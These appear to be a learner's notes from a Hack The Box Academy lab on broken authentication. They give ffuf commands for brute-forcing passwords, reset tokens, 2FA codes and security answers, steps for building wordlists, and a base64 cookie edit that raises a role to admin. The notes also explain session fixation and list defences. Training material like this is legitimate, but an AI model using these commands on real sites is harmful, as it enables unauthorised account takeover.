# Broken Authentication

## Brute Force Attacks

### Username

```sh
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

Note: Don't forget to include header `Content-Type: application/x-www-form-urlencoded` or `Content-Type: application/json` while ffuf-ing

### Password

```sh
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{12}' > custom_wordlist.txt
```

```sh
ffuf -X POST -w custom_wordlist.txt -u http://94.237.123.119:47701/index.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid username or password"
```

### Reset Tokens

Basic reset token

![](https://academy.hackthebox.com/storage/modules/269/bf/reset_bf_1.png)

```sh
seq -w 0 9999 > tokens.txt

ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

### 2FA
```sh
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

### Protection

- Rate limiting
- CAPTCHA

## Password Attacks

### Default Credentials

For instance, [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world. This is a great starting point for brute-forcing the city a user was born in.

```sh
# reduce to country user born in
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

```sh
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```

## Authentication Bypass

### Direct Access

You can intercept the response to 200 OK

### Parameter Modification

Change ID in parameter

## Session Attacks

```sh
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
# user=htb-stdnt;role=user

echo -n 'user=htb-stdnt;role=admin' | base64
```

### Further session attacks

More advanced session attacks, such as Session Puzzling, are covered in the [Abusing HTTP Misconfigurations](https://academy.hackthebox.com/module/details/189) module.

#### Session fixation

A web application vulnerable to session fixation does not assign a new session token after a successful authentication. 

Under these circumstances, a session fixation attack could look like this:
1. An attacker obtains a valid session token by authenticating to the web application. For instance, let us assume the session token is `a1b2c3d4e5f6`. Afterward, the attacker invalidates their session by logging out.
2. The attacker tricks the victim to use the known session token by sending the following link: `http://vulnerable.htb/?sid=a1b2c3d4e5f6`. When the victim clicks this link, the web application sets the `session` cookie to the provided value, i.e., the response looks like this:

```http
HTTP/1.1 200 OK
[...]
Set-Cookie: session=a1b2c3d4e5f6
[...]
```

3. The victim authenticates to the vulnerable web application. The victim's browser already stores the attacker-provided session cookie, so it is sent along with the login request. The victim uses the attacker-provided session token since the web application does not assign a new one.
4. Since the attacker knows the victim's session token `a1b2c3d4e5f6`, they can hijack the victim's session.

#### Improper session timeout
If a web application does not define a session timeout, the session token would be valid infinitely, enabling an attacker to use a hijacked session effectively forever.